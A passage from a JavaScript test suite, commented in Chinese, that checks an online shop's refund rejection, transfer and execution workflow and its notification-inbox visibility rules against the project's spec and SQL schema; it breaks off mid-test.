// §10.3 的拒绝，以及 §13.5 那条形状特别的日志。
//
// 拒绝的要点和批准正好相反：订单一个字都不能改，但订单变更记录里必须多一条 PAID → PAID。
// 这条日志看着像噪音，实际是用户在订单页上唯一能看到「我提过、被拒了、为什么」的地方。
const rejectDb = (opts = {}) => recorder({
  refund_requests: [
    { data: opts.refund === undefined ? pendingRefund : opts.refund, error: null },
    { data: opts.moved === 0 ? [] : [{ id: REFUND, status: 'rejected' }], error: null }
  ],
  orders: { data: opts.order === undefined ? { ...paidRow, status: 'paid' } : opts.order, error: null },
  site_settings: settings(opts.settings),
  notifications: opts.notifyError
    ? { data: null, error: { message: 'boom' } }
    : { data: [{ id: 'n2' }], error: null }
})

const rdb2 = rejectDb()
const rejected = await rejectRefund(rdb2, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, note: '证据不足，请补一张报错截图' })
assert(rejected.status === 200 && rejected.body.status === 'rejected', '管理员可以拒绝')
assert(rejected.body.order_status === 'paid', '拒绝之后订单还是已支付')
assert(!rdb2.calls.some(c => c.table === 'orders' && c.op === 'update'),
  '拒绝不能改订单——§13.5 只要求记一条日志，不是一次迁移')
const rejLog = rdb2.calls.find(c => c.table === 'order_status_log').payload
assert(rejLog.from_status === 'paid' && rejLog.to_status === 'paid', '§13.5：写成 PAID → PAID')
assert(rejLog.note.includes('证据不足'), '理由要落到订单变更记录里，否则用户看不到为什么被拒')
assert(rejLog.source === 'admin', '来源是管理员')
const rejUpd = rdb2.calls.find(c => c.table === 'refund_requests' && c.op === 'update')
assert(rejUpd.filters.status === 'pending', '拒绝同样要求申请还在待审批——并发保护')
assert(rejUpd.payload.decision_note.includes('证据不足') && rejUpd.payload.decided_by === ADMIN1,
  '决定和决定人一起落库')
const rejAudit = rdb2.calls.filter(c => c.table === 'refund_audit_log').map(c => c.payload.action)
assert(rejAudit.includes('reject'), '拒绝要留痕')

// 理由必填，而且空白字符不算填。
for (const noteMissing of [undefined, null, '', '   ', '\n\t']) {
  const db = rejectDb()
  const answer = await rejectRefund(db, { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, note: noteMissing })
  assert(answer.status === 400, `note=${JSON.stringify(noteMissing)} 应被拒——§10.3 要求必须填理由`)
  assert(!db.calls.some(c => c.op === 'update'), '理由没填时不能已经改了状态')
}
const tooLongNote = await rejectRefund(rejectDb(), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, note: 'x'.repeat(2001) })
assert(tooLongNote.status === 400, '理由过长应拒')

// 拒绝不设二次确认门：它是可逆的（用户能重提），确认框要留给不可逆的操作。
const rejectNoConfirm = await rejectRefund(rejectDb(), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, note: '不符合退款条件' })
assert(rejectNoConfirm.status === 200, '拒绝不需要 confirm')

for (const group of ['cs', 'postsale', 'presale', 'coworker', 'read', 'default']) {
  const db = rejectDb()
  const answer = await rejectRefund(db, { userId: ADMIN1, group }, { refund_id: REFUND, note: '不行' })
  assert(answer.status === 403, `${group} 不能拒绝退款`)
  assert(db.calls.length === 0, `${group} 被拒时不该产生任何数据库调用`)
}

// 抢不到就不能继续往下写：拒绝日志和通知都不该发出去。
const rejectLost = rejectDb({ moved: 0 })
const rejectLostAnswer = await rejectRefund(rejectLost, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, note: '重复申请' })
assert(rejectLostAnswer.status === 409, '抢不到时告诉他谁快了一步')
assert(!rejectLost.tables.includes('order_status_log'), '没拒成就不该留下一条拒绝日志')
assert(!rejectLost.tables.includes('notifications'), '也不该通知用户一次没发生的拒绝')

for (const status of ['approved', 'rejected', 'executing', 'completed', 'failed']) {
  const answer = await rejectRefund(rejectDb({ refund: { ...pendingRefund, status } }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, note: '不行' })
  assert(answer.status === 409, `${status} 的申请不能再拒绝`)
}

// §14 的 refund_auto_notify：关掉时静默跳过，但拒绝本身照样成立。
const quietReject = rejectDb({ settings: { refund_auto_notify: false } })
const quietAnswer = await rejectRefund(quietReject, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, note: '不符合条件' })
assert(quietAnswer.status === 200 && quietAnswer.body.notified === false, '开关关掉时如实说没通知')
assert(!quietReject.calls.some(c => c.table === 'notifications' && c.op === 'insert'),
  '关掉之后确实没给用户写站内信')
// 开关只管给用户的那条，不该顺手把审批通知的回收也关掉——否则那条带按钮的通知永远置顶在
// 全体管理员的收件箱里，而它对应的申请已经被拒了。
assert(quietReject.calls.some(c => c.table === 'notifications' && c.op === 'update'),
  '审批通知照样要收掉：settleApproval 走 update，和 refund_auto_notify 无关')
// 通知写不进去也不能让拒绝失败——拒绝已经落库了。
const rejectNotifyBroken = await rejectRefund(rejectDb({ notifyError: true }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, note: '不符合条件' })
assert(rejectNotifyBroken.status === 200 && rejectNotifyBroken.body.notified === false,
  '通知失败时拒绝仍然成立，只是如实报告没通知到')

console.log('Refund rejection: OK')

// ---------------------------------------------------------------------------
// §10.3 的转交。
//
// 这里最要紧的一条是「转交对象必须是管理员」：转给一个没有审批权的人，等于把申请扔进一个没人能
// 处理的地方，而它同时已经从原管理员的待办里消失了。那种卡死要等 48 小时超时才有人发现。
const ADMIN2 = '88888888-8888-4888-8888-888888888888'
const transferDb = (opts = {}) => recorder({
  refund_requests: [
    { data: opts.refund === undefined ? pendingRefund : opts.refund, error: null },
    { data: opts.moved === 0 ? [] : [{ id: REFUND, status: 'pending' }], error: null }
  ],
  orders: { data: { ...paidRow, status: 'paid' }, error: null },
  user_profiles: opts.receiverError
    ? { data: null, error: { message: 'boom' } }
    : { data: opts.receiver === undefined
      ? { user_id: ADMIN2, display_name: '老王', group_name: 'admin' }
      : opts.receiver, error: null },
  site_settings: settings(opts.settings),
  notifications: opts.notifyError
    ? { data: null, error: { message: 'boom' } }
    : { data: [{ id: 'n3' }], error: null }
})

const tdb = transferDb()
const transferred = await transferRefund(tdb, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, transfer_to: ADMIN2, note: '这单涉及链上退款，交给你判断' })
assert(transferred.status === 200, '管理员可以转交')
// 落库状态是 pending 而不是 transferred：接手人要看到一条能直接审批的申请。
assert(transferred.body.status === 'pending', '转交后回到待审批，否则接手人没有可点的按钮')
assert(transferred.body.transferred_to === ADMIN2, '如实返回转给了谁')
const tUpd = tdb.calls.find(c => c.table === 'refund_requests' && c.op === 'update')
assert(tUpd.payload.status === 'pending', 'update 直接落 pending')
assert(tUpd.payload.transferred_to === ADMIN2, 'transferred_to 要落库——§10.6 的看板要能回答等谁')
assert(tUpd.filters.status === 'pending', '并发保护：要求申请还在原状态')
// 审计里两笔都要有，否则最后一笔和库里的状态不一致，而 §10.8 的导出拿审计当事实来源。
const tAudit = tdb.calls.filter(c => c.table === 'refund_audit_log').map(c => c.payload.action)
assert(tAudit.includes('transfer'), '转交本身要留痕')
assert(tAudit.includes('reopen_after_transfer'),
  '回到 pending 也要留痕——否则审计的最后一笔是 transferred，和库里的 pending 对不上')
const tNotif = tdb.calls.find(c => c.table === 'notifications' && c.op === 'insert').payload
assert(tNotif.recipient_id === ADMIN2 && tNotif.scope === 'user',
  '转交通知只发给接手人：再广播给全体管理员的话，转交和不转交没有区别')
assert(tNotif.state === 'pending' && tNotif.actions.length === 2, '接手人拿到批准和拒绝两个按钮')
assert(!tNotif.actions.some(a => a.type === 'transfer_refund'),
  '不给「再转交」按钮——48 小时超时是按申请算的，转多少次都不会重置')
assert(tNotif.body.includes('装不上'), '原始退款原因要带给接手人，否则他要从零判断')
// §9.6：这条带审批按钮的通知必须置顶高亮，而且这是 insertNotification 算的，不靠调用方传。
assert(tNotif.pinned === true && tNotif.highlighted === true,
  '§9.6 强制置顶高亮——之前 presentationFor 只有测试在调，插入路径漏了')

// 转交对象必须存在、必须是管理员。
const notAdmin = await transferRefund(transferDb({
  receiver: { user_id: ADMIN2, display_name: '客服小李', group_name: 'cs' }
}), { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
assert(notAdmin.status === 400 && notAdmin.body.error.includes('管理员'),
  '不能转给非管理员——那条申请会卡在没人有权处理的地方')
const noReceiver = await transferRefund(transferDb({ receiver: null }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
assert(noReceiver.status === 404, '转交对象不存在应拒')
const receiverBroken = await transferRefund(transferDb({ receiverError: true }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
assert(receiverBroken.status === 500, '读不到转交对象时不能当成「不是管理员」也不能放行')
// 校验没过时申请一个字都不能改。
const rejectedTransfer = transferDb({ receiver: { user_id: ADMIN2, display_name: 'x', group_name: 'read' } })
await transferRefund(rejectedTransfer, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
assert(!rejectedTransfer.calls.some(c => c.op === 'update'), '转交对象不合格时不能已经改了申请')

// transfer_to 的形状。
for (const badTarget of [undefined, null, '', 'not-a-uuid', 123, {}]) {
  const db = transferDb()
  const answer = await transferRefund(db, { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, transfer_to: badTarget, note: '交给你' })
  assert(answer.status === 400, `transfer_to=${JSON.stringify(badTarget)} 应拒`)
  assert(db.calls.length === 0, '目标不合法时不该查库')
}
const selfTransfer = await transferRefund(transferDb(), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, transfer_to: ADMIN1, note: '交给我自己' })
assert(selfTransfer.status === 400 && selfTransfer.body.error.includes('自己'),
  '转给自己是空操作，但会把自己的待办清掉再建一个，直接拒掉')

// 说明必填：接手人需要知道为什么轮到他。
for (const noteMissing of [undefined, null, '', '  ']) {
  const answer = await transferRefund(transferDb(), { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, transfer_to: ADMIN2, note: noteMissing })
  assert(answer.status === 400, `转交说明 ${JSON.stringify(noteMissing)} 应拒`)
}

for (const group of ['cs', 'postsale', 'presale', 'coworker', 'read', 'default']) {
  const db = transferDb()
  const answer = await transferRefund(db, { userId: ADMIN1, group },
    { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
  assert(answer.status === 403, `${group} 不能转交退款`)
  assert(db.calls.length === 0, `${group} 被拒时不该产生任何数据库调用`)
}

const transferLost = transferDb({ moved: 0 })
const transferLostAnswer = await transferRefund(transferLost, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
assert(transferLostAnswer.status === 409, '抢不到时告诉他谁快了一步')
assert(!transferLost.calls.some(c => c.table === 'notifications' && c.op === 'insert'),
  '抢不到就不能给接手人发通知——否则他收到一条已经被别人处理掉的申请')

for (const status of ['approved', 'rejected', 'executing', 'completed', 'failed']) {
  const answer = await transferRefund(transferDb({ refund: { ...pendingRefund, status } }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
  assert(answer.status === 409, `${status} 的申请不能转交`)
}

// 通知发不出去不回滚：申请已经回到 pending 并记了 transferred_to，看板和超时提醒都还找得到它。
const transferNotifyBroken = await transferRefund(transferDb({ notifyError: true }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, transfer_to: ADMIN2, note: '交给你' })
assert(transferNotifyBroken.status === 200 && transferNotifyBroken.body.notified === false,
  '通知失败时转交仍然成立，只是如实报告没通知到')

console.log('Refund transfer: OK')

// ---------------------------------------------------------------------------
// §13.4 的「退款成功」和状态图里的「无法退款」。
//
// 这一段钉的是钱的账实一致：订单和申请必须一起动，中间任何一步失败都不能留下「订单已退款、申请
// 却永远不会完结」或者反过来的组合。所以下面既测正常路径，也逐个测每一步失败时留下的状态。
const approvedRefund = { ...pendingRefund, status: 'approved', amount_minor: 9500 }
const execDb = (opts = {}) => recorder({
  refund_requests: [
    { data: opts.refund === undefined ? approvedRefund : opts.refund, error: null },
    // 第一次 update 是抢 executing，第二次是落终态。
    { data: opts.claimed === 0 ? [] : [{ id: REFUND, status: 'executing' }], error: null },
    { data: opts.settled === 0 ? [] : [{ id: REFUND }], error: null }
  ],
  orders: [
    { data: opts.order === undefined ? { ...paidRow, status: 'refund_pending' } : opts.order, error: null },
    opts.orderMoveError
      ? { data: null, error: { message: 'boom' } }
      : { data: opts.orderMoved === 0 ? [] : [{ id: RORDER }], error: null }
  ],
  site_settings: settings(opts.settings),
  notifications: opts.notifyError
    ? { data: null, error: { message: 'boom' } }
    : { data: [{ id: 'n4' }], error: null }
})

const edb = execDb()
const executed = await executeRefund(edb, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success', confirm: true })
assert(executed.status === 200, '管理员可以标记退款成功')
assert(executed.body.status === 'completed' && executed.body.order_status === 'refunded', '§13.4 的两个终态')
assert(executed.body.can_execute === false, '登记之后按钮消失')
const execUpds = edb.calls.filter(c => c.table === 'refund_requests' && c.op === 'update')
assert(execUpds.length === 2, '先抢 executing 再落终态，两次 update')
assert(execUpds[0].filters.status === 'approved' && execUpds[0].payload.status === 'executing',
  '第一步从已批准抢到执行中——这是并发保护')
assert(execUpds[1].filters.status === 'executing' && execUpds[1].payload.status === 'completed',
  '第二步从执行中落已完成')
const execOrderUpd = edb.calls.find(c => c.table === 'orders' && c.op === 'update')
assert(execOrderUpd.filters.status === 'refund_pending', '订单的 update 要求它还在退款中')
assert(execOrderUpd.payload.status === 'refunded', '订单进已退款')
assert(!('paid_amount_minor' in execOrderUpd.payload), '登记退款不改订单金额——账上实付过多少就是多少')
const execLog = edb.calls.find(c => c.table === 'order_status_log').payload
assert(execLog.from_status === 'refund_pending' && execLog.to_status === 'refunded', 'REFUND_PENDING → REFUNDED')
const execAudit = edb.calls.filter(c => c.table === 'refund_audit_log').map(c => c.payload.action)
assert(execAudit.includes('execute_claim') && execAudit.includes('execute_success'),
  '抢占和执行结果各留一条痕迹')
const doneNotif = edb.calls.find(c => c.table === 'notifications' && c.op === 'insert').payload
assert(doneNotif.recipient_id === BUYER && doneNotif.kind === 'refund', '退款结果通知发给下单的人')
assert(doneNotif.title.includes('退款已完成'), '成功时的标题')
assert(doneNotif.pinned === false, '这条只是告知，不该占住置顶位')

// 「无法退款」：订单回到 PAID，申请落 failed，而 §10.7 允许 failed 再回 executing，所以不是死路。
const failedOut = execDb()
const failedAnswer = await executeRefund(failedOut, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'failed', note: '渠道不支持退款，已改为人工转账', confirm: true })
assert(failedAnswer.status === 200 && failedAnswer.body.status === 'failed', '可以标记无法退款')
assert(failedAnswer.body.order_status === 'paid', '无法退款时订单退回已支付')
const failedOrderUpd = failedOut.calls.find(c => c.table === 'orders' && c.op === 'update')
assert(failedOrderUpd.payload.status === 'paid', 'REFUND_PENDING → PAID')
const failedNotif = failedOut.calls.find(c => c.table === 'notifications' && c.op === 'insert').payload
assert(failedNotif.title.includes('退款未成功'), '失败时的标题')
assert(failedNotif.body.includes('渠道不支持'), '失败原因要写给用户，否则他只看到一句「未成功」')
// 失败原因必填，成功备注不必填。
for (const noteMissing of [undefined, null, '', '  ']) {
  const answer = await executeRefund(execDb(), { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, outcome: 'failed', note: noteMissing, confirm: true })
  assert(answer.status === 400, `无法退款时 note=${JSON.stringify(noteMissing)} 应拒`)
}
const noNoteSuccess = await executeRefund(execDb(), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success', confirm: true })
assert(noNoteSuccess.status === 200, '标记成功不强制写备注')

// outcome 的形状。
for (const badOutcome of [undefined, null, '', 'ok', 'SUCCESS', 'completed', 1, {}]) {
  const db = execDb()
  const answer = await executeRefund(db, { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, outcome: badOutcome, confirm: true })
  assert(answer.status === 400, `outcome=${JSON.stringify(badOutcome)} 应拒`)
  assert(db.calls.length === 0, 'outcome 不合法时不该查库')
}

// §14 的强制二次确认在这里必须过——这是不可逆操作，而浏览器弹框拦不住直接调接口的人。
const execConfirm = execDb()
const needsConfirm2 = await executeRefund(execConfirm, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success' })
assert(needsConfirm2.status === 428 && needsConfirm2.body.requires_confirm === true, '缺二次确认应拒')
assert(!execConfirm.calls.some(c => c.op === 'update'), '被确认拦下时一个字都没改')
for (const badConfirm of [false, 'true', 1, null]) {
  const answer = await executeRefund(execDb(), { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, outcome: 'success', confirm: badConfirm })
  assert(answer.status === 428, `confirm=${JSON.stringify(badConfirm)} 不算确认`)
}
const noConfirm2 = await executeRefund(execDb({ settings: { refund_require_second_confirm: false } }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, outcome: 'success' })
assert(noConfirm2.status === 200, '关掉开关后可以直接登记')

// 申请必须已批准。没批准就能登记退款成功，等于跳过整个审批流程。
for (const status of ['pending', 'transferred', 'rejected', 'completed']) {
  const answer = await executeRefund(execDb({ refund: { ...approvedRefund, status } }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, outcome: 'success', confirm: true })
  assert(answer.status === 409, `${status} 的申请不能直接登记退款结果`)
}
// 上次失败的可以重试（§10.7 的 failed → executing）。
const retried = await executeRefund(execDb({ refund: { ...approvedRefund, status: 'failed' } }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, outcome: 'success', confirm: true })
assert(retried.status === 200, '上次失败的退款可以重试，而不是让人另开一条申请丢掉审计链')

// 上次「抢到了但订单没改成」留在 executing 的，必须能接着走完。状态图里没有 executing → executing
// 这条边（自环会让「执行中」失去含义），所以这一次不按迁移检查——refund-execute 传的是 resumable。
// 少了这一条，那些被有意留在 executing 的申请会撞上 409「不能从执行中变更为执行中」，而它们留在
// 那里的全部目的就是避免这种死路：订单还在退款中，别处没有任何入口能推完它。
const resumeDb = execDb({ refund: { ...approvedRefund, status: 'executing' } })
const resumed = await executeRefund(resumeDb, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success', confirm: true })
assert(resumed.status === 200 && resumed.body.status === 'completed',
  '停在执行中的申请可以接着走完，而不是永久卡住')
const resumeUpds = resumeDb.calls.filter(c => c.table === 'refund_requests' && c.op === 'update')
assert(resumeUpds[0].filters.status === 'executing', '这一次的抢占条件是它此刻的状态')
assert(resumeDb.calls.find(c => c.table === 'orders' && c.op === 'update').payload.status === 'refunded',
  '订单仍然要从退款中走到已退款')

// 订单必须在 REFUND_PENDING。这一条不能靠「申请是 approved」推出来：批准时改订单那一步可能失败过，
// 那时申请已批准而订单还是 PAID，此时登记成功会把一笔没进退款流程的订单直接改成已退款。
for (const pendingOrder of ['paid', 'pending', 'refunded', 'cancelled', 'failed']) {
  const db = execDb({ order: { ...paidRow, status: pendingOrder } })
  const answer = await executeRefund(db, { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, outcome: 'success', confirm: true })
  assert(answer.status === 409, `订单在 ${pendingOrder} 时不能登记退款结果`)
  assert(!db.calls.some(c => c.op === 'update'), `订单在 ${pendingOrder} 时不能已经改了申请`)
}

// 抢不到 executing：别人正在处理，什么都不能动。
const stuckExec = execDb({ claimed: 0 })
const stuckExecAnswer = await executeRefund(stuckExec, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success', confirm: true })
assert(stuckExecAnswer.status === 409, '抢不到时告诉他有人在处理')
assert(!stuckExec.calls.some(c => c.table === 'orders' && c.op === 'update'),
  '抢不到就不能动订单——否则订单变成已退款而这条申请从没执行过')
assert(!stuckExec.tables.includes('order_status_log'), '也不留状态日志')

// 抢到了但订单没改成：申请必须留在 executing，不能推到终态。终态 + 订单还在退款中，等于一笔钱
// 永久对不上而且没有入口能修。
for (const opts of [{ orderMoved: 0 }, { orderMoveError: true }]) {
  const db = execDb(opts)
  const answer = await executeRefund(db, { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, outcome: 'success', confirm: true })
  assert(answer.status === 409, '订单没改成要报失败，因为这次登记没有生效')
  assert(answer.body.status === 'executing', '申请留在执行中，按钮还在，可以再点一次')
  const upds = db.calls.filter(c => c.table === 'refund_requests' && c.op === 'update')
  assert(upds.length === 1, '只有抢占那一次 update，不能把申请推到终态')
  assert(!db.tables.includes('order_status_log'), '订单没动就不写状态日志')
  assert(!db.calls.some(c => c.table === 'notifications' && c.op === 'insert'),
    '不能通知用户一次没有生效的退款')
  assert(db.calls.filter(c => c.table === 'refund_audit_log')
    .some(c => c.payload.action === 'execute_order_move_failed'), '这次失败要留痕')
}

// 订单改完了但申请落终态失败：账面是对的（订单已退款），申请停在 executing 由人工推完。
const halfSettled = await executeRefund(execDb({ settled: 0 }), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success', confirm: true })
assert(halfSettled.status === 200 && halfSettled.body.order_status === 'refunded',
  '订单已经改完，这次登记是生效的')
assert(halfSettled.body.status === 'executing', '申请没落终态就如实说它还在执行中')

for (const group of ['cs', 'postsale', 'presale', 'coworker', 'read', 'default']) {
  const db = execDb()
  const answer = await executeRefund(db, { userId: ADMIN1, group },
    { refund_id: REFUND, outcome: 'success', confirm: true })
  assert(answer.status === 403, `${group} 不能标记退款结果`)
  assert(db.calls.length === 0, `${group} 被拒时不该产生任何数据库调用`)
}

// §14 的 refund_auto_notify 关掉时静默跳过，但登记本身成立。
const quietExec = execDb({ settings: { refund_auto_notify: false } })
const quietExecAnswer = await executeRefund(quietExec, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, outcome: 'success', confirm: true })
assert(quietExecAnswer.status === 200 && quietExecAnswer.body.notified === false, '如实说没通知')
assert(!quietExec.calls.some(c => c.table === 'notifications' && c.op === 'insert'), '确实没发')
const execNotifyBroken = await executeRefund(execDb({ notifyError: true }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, outcome: 'success', confirm: true })
assert(execNotifyBroken.status === 200 && execNotifyBroken.body.notified === false,
  '通知失败不能让一笔已经登记的退款报失败——那会让人再退一次')

console.log('Refund execution: OK')

// ---------------------------------------------------------------------------
// §9 的收件箱。
//
// 这一段里最重要的不是列表格式，是可见性。requireUser 交出来的是 service client，它绕过 RLS，
// 所以 schema.sql 里那个 private.can_see_notification() 在这条路径上一点作用都没有——判定必须由
// canSeeNotification() 在 JS 里做完。判错的后果不是报错，是有人读到了别人的收件箱，而那不会有
// 任何症状。所以下面先把 JS 的阈值和 SQL 函数的 case 分支对着钉死。
const scopeCase = schemaSql.match(
  /create or replace function private\.can_see_notification\(scope text, recipient uuid\)[\s\S]*?\$\$([\s\S]*?)\$\$/
)
assert(scopeCase, '找不到 private.can_see_notification 的定义——它是可见性的另一半')
assert(/when 'user' then recipient = \(select auth\.uid\(\)\)/.test(scopeCase[1]),
  'user 范围按收件人判，JS 那边也是比 recipient_id')
assert(/when 'admin' then \(select private\.is_admin\(\)\)/.test(scopeCase[1]), 'admin 范围走 is_admin')
assert(/when 'cs' then \(select private\.is_staff\(\)\)/.test(scopeCase[1]),
  'cs 范围走 is_staff——所以售前售后也算客服，JS 的阈值必须是 777 而不是 888')
assert(/when 'all' then true/.test(scopeCase[1]), 'all 范围人人可见')
// 两个 rank 阈值从 SQL 函数体里读出来，而不是照抄一份。
const staffSql = schemaSql.match(/function private\.is_staff\(\)[\s\S]*?my_rank\(\) >= (\d+)/)
const adminSql = schemaSql.match(/function private\.is_admin\(\)[\s\S]*?my_rank\(\) >= (\d+)/)
assert(Number(staffSql[1]) === NOTIFICATION_SCOPE_RANK.cs,
  `cs 范围的阈值两边要一致：SQL ${staffSql[1]}，JS ${NOTIFICATION_SCOPE_RANK.cs}`)
assert(Number(adminSql[1]) === NOTIFICATION_SCOPE_RANK.admin,
  `admin 范围的阈值两边要一致：SQL ${adminSql[1]}，JS ${NOTIFICATION_SCOPE_RANK.admin}`)
// SQL 里出现的每个 scope 都要在 JS 的列表里，反之亦然——多一个的方向是泄露。
const sqlScopes = [...scopeCase[1].matchAll(/when '(\w+)' then/g)].map(m => m[1])
for (const s of sqlScopes) assert(NOTIFICATION_SCOPES.includes(s), `SQL 有 scope ${s}，JS 没有`)
for (const s of NOTIFICATION_SCOPES) assert(sqlScopes.includes(s), `JS 有 scope ${s}，SQL 没有`)

// 逐个组核对能看到哪些广播范围。
assert(broadcastScopesFor(999).sort().join() === 'admin,all,cs', '管理员能看到全部三种广播')
assert(broadcastScopesFor(888).sort().join() === 'all,cs', 'cs 组看得到客服广播，看不到管理员广播')
assert(broadcastScopesFor(777).sort().join() === 'all,cs', '售前售后同样算客服')
assert(broadcastScopesFor(555).join() === 'all', '文案只看得到全站广播')
assert(broadcastScopesFor(111).join() === 'all', 'read 组同上')
assert(broadcastScopesFor(0).join() === 'all', '普通用户只看得到全站广播')
assert(!broadcastScopesFor(999).includes('user'), 'user 不是广播范围，不能靠 rank 拿到')

const OTHER = '99999999-9999-4999-8999-999999999999'
const mineRow = { id: '10000000-0000-4000-8000-000000000001', scope: 'user', recipient_id: BUYER, kind: 'order', title: 'a', body: 'b', state: null, actions: [], created_at: '2026-08-20T00:00:00Z' }
const theirRow = { id: '10000000-0000-4000-8000-000000000002', scope: 'user', recipient_id: OTHER, kind: 'order', title: 'a', body: 'b', state: null, actions: [], created_at: '2026-08-21T00:00:00Z' }
const adminRow = { id: '10000000-0000-4000-8000-000000000003', scope: 'admin', recipient_id: null, kind: 'refund_approval', title: 'a', body: 'b', state: 'pending', actions: [{ type: 'approve_refund', label: '批准', target: REFUND }], created_at: '2026-08-22T00:00:00Z' }
const csRow = { id: '10000000-0000-4000-8000-000000000004', scope: 'cs', recipient_id: null, kind: 'session', title: 'a', body: 'b', state: null, actions: [], created_at: '2026-08-23T00:00:00Z' }
const allRow = { id: '10000000-0000-4000-8000-000000000005', scope: 'all', recipient_id: null, kind: 'system', title: 'a', body: 'b', state: null, actions: [], created_at: '2026-08-24T00:00:00Z' }

// 逐条问 canSeeNotification，这是接口的最后一道防线。
assert(canSeeNotification(mineRow, BUYER, 0) === true, '自己的通知自己看得见')
assert(canSeeNotification(mineRow, OTHER, 999) === false,
  '别人的私信管理员也看不见——rank 再高也不该越过 user 范围')
assert(canSeeNotification(theirRow, BUYER, 777) === false, '不是发给我的就看不见')
assert(canSeeNotification(adminRow, BUYER, 999) === true, '管理员看得见管理员广播')
assert(canSeeNotification(adminRow, BUYER, 888) === false, 'cs 组看不见管理员广播')
assert(canSeeNotification(csRow, BUYER, 777) === true, '售后看得见客服广播')
assert(canSeeNotification(csRow, BUYER, 555) === false, '文案看不见客服广播')
assert(canSeeNotification(allRow, BUYER, 0) === true, '全站广播人人可见')
assert(canSeeNotification({ scope: 'user', recipient_id: null }, null, 999) === false,
  'recipient_id 和 userId 都为空时不能算匹配——一个 == 就会让所有匿名比较都通过')
assert(canSeeNotification({ scope: 'user', recipient_id: undefined }, undefined, 999) === false, '同上')
assert(canSeeNotification({ scope: 'nonsense', recipient_id: null }, BUYER, 999) === false,
  '未知范围默认看不见，而不是默认可见')
assert(canSeeNotification(null, BUYER, 999) === false, '空行看不见')

const receiptsFor = rows => ({ data: rows, error: null })
const inboxDb = (notifRows, receiptRows = []) => recorder({
  notifications: { data: notifRows, error: null },
  notification_receipts: receiptsFor(receiptRows),
  site_settings: settings()
})

// 列表：库里混着别人的私信时也不能漏出去。
const listDb = inboxDb([mineRow, theirRow, adminRow, csRow, allRow])
const listed = await listNotifications(listDb, { userId: BUYER, group: 'default', rank: 0 }, {})
const listedIds = listed.body.items.map(n => n.id)
assert(listed.status === 200, '列表可读')
assert(listedIds.includes(mineRow.id) && listedIds.includes(allRow.id), '自己的和全站的都在')
assert(!listedIds.includes(theirRow.id), '别人的私信不能出现在我的列表里')
assert(!listedIds.includes(adminRow.id) && !listedIds.includes(csRow.id),
  '普通用户拿不到管理员和客服广播——就算 or 条件写漏了，最后那次 filter 也要挡住')
// or 条件里放进去的 scope 必须来自 broadcastScopesFor，不能是手写的。
const listQuery = listDb.calls.find(c => c.table === 'notifications')
assert(listQuery.or.includes(`recipient_id.eq.${BUYER}`), '查询里带上自己的收件人条件')
assert(listQuery.or.includes('scope.in.(all)'), '普通用户的 or 里只有 all')
assert(!listQuery.or.includes('admin'), '普通用户的查询条件里不该出现 admin')
const adminList = inboxDb([mineRow, adminRow, csRow, allRow])
const adminListed = await listNotifications(adminList, { userId: BUYER, group: 'admin', rank: 999 }, {})
assert(adminListed.body.items.length === 4, '管理员看得到自己的和三种广播')
assert(adminList.calls.find(c => c.table === 'notifications').or.includes('cs'),
  '管理员的 or 里要包含 cs——否则客服广播对管理员不可见，而 is_staff 说它可见')

// 排序：置顶优先，再按时间倒序。§9.6 要求待审批的一直挡在眼前，读过了也不许沉下去。
assert(adminList.calls.find(c => c.table === 'notifications').orders.length === 2, '两级排序')
assert(adminList.calls.find(c => c.table === 'notifications').orders[0].col === 'pinned',
  '第一级按置顶——§9.6')
assert(adminList.calls.find(c => c.table === 'notifications').orders[0].ascending === false, '置顶的在前')
// pinned 是重算的，不是读库里的列：库里那两列在 settleApproval 之后会被收掉。
const pinnedItem = adminListed.body.items.find(n => n.id === adminRow.id)
assert(pinnedItem.pinned === true && pinnedItem.highlighted === true,
  '带审批按钮且待处理的要置顶高亮')
const plainItem = adminListed.body.items.find(n => n.id === allRow.id)
assert(plainItem.pinned === false, '普通通知不占置顶位')

// 已读状态来自 receipts；没有 receipt 行的一律算未读。
const readMix = inboxDb([mineRow, allRow], [
